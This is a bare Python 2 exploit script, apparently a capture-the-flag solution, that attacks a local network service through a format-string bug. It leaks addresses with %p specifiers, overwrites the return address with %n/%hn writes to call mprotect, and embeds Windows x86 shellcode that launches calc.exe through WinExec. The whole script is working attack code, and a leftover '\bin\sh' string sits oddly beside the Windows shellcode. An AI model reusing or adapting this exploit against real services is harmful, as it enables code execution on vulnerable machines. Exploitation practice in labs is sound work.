import socket
import struct
import time


host = "127.0.0.1"
port = 1234
shell = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"
payload = '\x00\x04\x00\x00%6$p %50$p %51$p'
#payload4 = 'QUIT' + '\x90' * 100 +shell
payload2 = 'aaaa%99999p%7$n'

def fmt(addr, dest, s):
	if addr < 0x18000:
		payload = struct.pack('<I', dest) + '%' + str(addr-4) + 'p%7$n'
		time.sleep(0.5)		
		s.send(payload)	

	else:
		a = hex(addr)
		op = int(a[2:6],16) - 4
		payload = struct.pack('<I', dest + 2) + '%' + str(op) + 'p%7$hn'
		time.sleep(0.5)		
		s.send(payload)	
		op = int(a[6:10],16) - 4
		payload = struct.pack('<I', dest) + '%' + str(op) + 'p%7$hn'
		time.sleep(0.5)		
		s.send(payload)	

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

time.sleep(0.5)
s.send(payload)
time.sleep(0.5)
a = s.recv(1024)
print a
leak = int(a[57:65],16)
buf = int(a[41:49],16)
ret = buf + 0x410
base = leak - 0x1cb8
print 'base = ' + hex(base)
print 'buf = ' + hex(buf)
mprotect = base + 0x0003d200
print hex(mprotect)
fmt(mprotect, ret, s)
fmt(ret + 24, ret + 4, s)
fmt(buf+4, ret + 8, s)
fmt(0x400, ret + 12, s)
fmt(0x7, ret + 16, s)

payload = 'QUIT' + '\bin\sh'
time.sleep(0.5)
s.send(payload)
print 'done'

raw_input()
#print 'buf = ' + a[183:191]

